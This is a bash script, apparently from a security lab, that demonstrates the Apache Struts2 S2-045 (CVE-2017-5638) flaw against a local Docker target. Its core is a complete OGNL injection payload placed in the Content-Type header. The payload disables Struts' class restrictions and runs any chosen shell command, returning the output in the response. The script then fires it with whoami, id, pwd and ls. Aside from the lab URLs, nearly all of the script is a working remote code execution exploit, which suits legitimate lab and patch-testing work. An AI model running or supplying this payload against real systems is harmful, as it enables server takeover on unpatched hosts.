#!/bin/bash
# =============================================================================
# S2-045 Exploitation Demonstration Script
# =============================================================================
# This script demonstrates the S2-045 vulnerability (CVE-2017-5638) by
# sending malformed Content-Type headers with OGNL injection payloads.
#
# WARNING: This is for educational purposes only. Only use on systems
# you own or have explicit permission to test.
# =============================================================================

set -u

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Configuration
VULNERABLE_APP_URL="${VULNERABLE_APP_URL:-http://app-vulnerable:8080/struts-lab}"
BASE_URL="${BASE_URL:-http://127.0.0.1:8081/struts-lab}"

# Use container URL if running in Docker, otherwise use localhost
if [ -n "${VULNERABLE_APP_URL:-}" ] && curl -s "${VULNERABLE_APP_URL}/health" > /dev/null 2>&1; then
    TARGET_URL="${VULNERABLE_APP_URL}"
else
    TARGET_URL="${BASE_URL}"
fi

echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo -e "${BLUE} S2-045 (CVE-2017-5638) Exploitation Demonstration${NC}"
echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
echo ""
echo -e "${YELLOW}Target:${NC} ${TARGET_URL}"
echo -e "${YELLOW}Vulnerability:${NC} Apache Struts2 S2-045 (OGNL Injection)"
echo ""

# =============================================================================
# Helper Functions
# =============================================================================

log_test() {
    echo -e "${YELLOW}[TEST]${NC} $1"
}

log_success() {
    echo -e "${GREEN}  ✓ $1${NC}"
}

log_error() {
    echo -e "${RED}  ✗ $1${NC}"
}

log_info() {
    echo -e "${BLUE}  ℹ $1${NC}"
}

# =============================================================================
# OGNL Payload Construction
# =============================================================================

# Build OGNL payload for command execution
# The payload uses OGNL expression evaluation to execute system commands
build_ognl_payload() {
    local command="$1"
    # URL encode the command
    local encoded_command=$(echo -n "$command" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read()))")
    
    # OGNL payload structure:
    # %{@java.lang.Runtime@getRuntime().exec('COMMAND')}
    # In Content-Type header, this gets evaluated when error messages are processed
    echo "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='${encoded_command}').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
}

# =============================================================================
# Exploitation Functions
# =============================================================================

# Test 1: Verify vulnerable application is running
test_vulnerability_check() {
    log_test "Checking if vulnerable application is accessible"
    
    response=$(curl -s -o /dev/null -w "%{http_code}" "${TARGET_URL}/health" 2>&1)
    
    if [ "$response" = "200" ]; then
        log_success "Application is accessible (HTTP $response)"
        return 0
    else
        log_error "Application not accessible (HTTP $response)"
        log_info "Make sure the vulnerable app is running: docker compose up app-vulnerable"
        return 1
    fi
}

# Test 2: Execute harmless command (whoami)
exploit_whoami() {
    log_test "Exploiting S2-045 to execute 'whoami' command"
    
    local payload=$(build_ognl_payload "whoami")
    
    # Send POST request with malicious Content-Type header
    response=$(curl -s -w "\n%{http_code}" \
        -X POST \
        -H "Content-Type: ${payload}" \
        -F "upload=@/dev/null" \
        "${TARGET_URL}/upload" 2>&1)
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "500" ]; then
        # Check if command output is in response
        # The command output may appear at the beginning of the response body
        # before any HTML/error messages
        if echo "$body" | grep -qE "(root|tomcat|nobody|uid=|gid=|/usr/local/tomcat|/tmp)"; then
            log_success "Command executed! Output found in response"
            echo -e "${GREEN}  Response excerpt (first 20 lines):${NC}"
            echo "$body" | head -n 20 | sed 's/^/    /'
        else
            log_info "Request processed (HTTP $http_code)"
            log_info "Command may have executed - check full response body:"
            echo "$body" | head -n 30 | sed 's/^/    /'
        fi
    else
        log_error "Exploitation failed (HTTP $http_code)"
    fi
}

# Test 3: Execute id command
exploit_id() {
    log_test "Exploiting S2-045 to execute 'id' command"
    
    local payload=$(build_ognl_payload "id")
    
    response=$(curl -s -w "\n%{http_code}" \
        -X POST \
        -H "Content-Type: ${payload}" \
        -F "upload=@/dev/null" \
        "${TARGET_URL}/upload" 2>&1)
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "500" ]; then
        if echo "$body" | grep -qE "(uid=|gid=)"; then
            log_success "Command executed! ID info found in response"
            echo -e "${GREEN}  Response excerpt:${NC}"
            echo "$body" | grep -E "(uid=|gid=)" | head -n 3 | sed 's/^/    /'
        else
            log_info "Request processed (HTTP $http_code)"
            log_info "Full response (first 30 lines):"
            echo "$body" | head -n 30 | sed 's/^/    /'
        fi
    else
        log_error "Exploitation failed (HTTP $http_code)"
    fi
}

# Test 4: Execute pwd command
exploit_pwd() {
    log_test "Exploiting S2-045 to execute 'pwd' command"
    
    local payload=$(build_ognl_payload "pwd")
    
    response=$(curl -s -w "\n%{http_code}" \
        -X POST \
        -H "Content-Type: ${payload}" \
        -F "upload=@/dev/null" \
        "${TARGET_URL}/upload" 2>&1)
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "500" ]; then
        if echo "$body" | grep -qE "(/usr/local/tomcat|/tmp|/var)"; then
            log_success "Command executed! Working directory found"
            echo -e "${GREEN}  Response excerpt:${NC}"
            echo "$body" | grep -oE '/[^ <>\n]+' | head -n 5 | sed 's/^/    /'
        else
            log_info "Request processed (HTTP $http_code)"
            log_info "Full response (first 30 lines):"
            echo "$body" | head -n 30 | sed 's/^/    /'
        fi
    else
        log_error "Exploitation failed (HTTP $http_code)"
    fi
}

# Test 5: Execute ls command
exploit_ls() {
    log_test "Exploiting S2-045 to execute 'ls -la /tmp' command"
    
    local payload=$(build_ognl_payload "ls -la /tmp | head -5")
    
    response=$(curl -s -w "\n%{http_code}" \
        -X POST \
        -H "Content-Type: ${payload}" \
        -F "upload=@/dev/null" \
        "${TARGET_URL}/upload" 2>&1)
    
    http_code=$(echo "$response" | tail -n 1)
    body=$(echo "$response" | sed '$d')
    
    if [ "$http_code" = "200" ] || [ "$http_code" = "500" ]; then
        if echo "$body" | grep -qE "(total|drwx|-rw-|d---)"; then
            log_success "Command executed! Directory listing found"
            echo -e "${GREEN}  Response excerpt:${NC}"
            echo "$body" | grep -E "(total|drwx|-rw-|d---)" | head -n 5 | sed 's/^/    /'
        else
            log_info "Request processed (HTTP $http_code)"
            log_info "Full response (first 30 lines):"
            echo "$body" | head -n 30 | sed 's/^/    /'
        fi
    else
        log_error "Exploitation failed (HTTP $http_code)"
    fi
}

# =============================================================================
# Main Execution
# =============================================================================

main() {
    echo -e "${YELLOW}Starting exploitation demonstration...${NC}"
    echo ""
    
    # Check if application is accessible
    if ! test_vulnerability_check; then
        echo ""
        log_error "Cannot proceed - vulnerable application is not accessible"
        exit 1
    fi
    
    echo ""
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE} Exploitation Tests${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    
    # Run exploitation tests
    exploit_whoami
    echo ""
    
    exploit_id
    echo ""
    
    exploit_pwd
    echo ""
    
    exploit_ls
    echo ""
    
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${BLUE} Demonstration Complete${NC}"
    echo -e "${BLUE}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    log_info "Note: Command output may appear in error messages or response body"
    log_info "Check application logs for additional details"
    echo ""
}

# Run main function
main

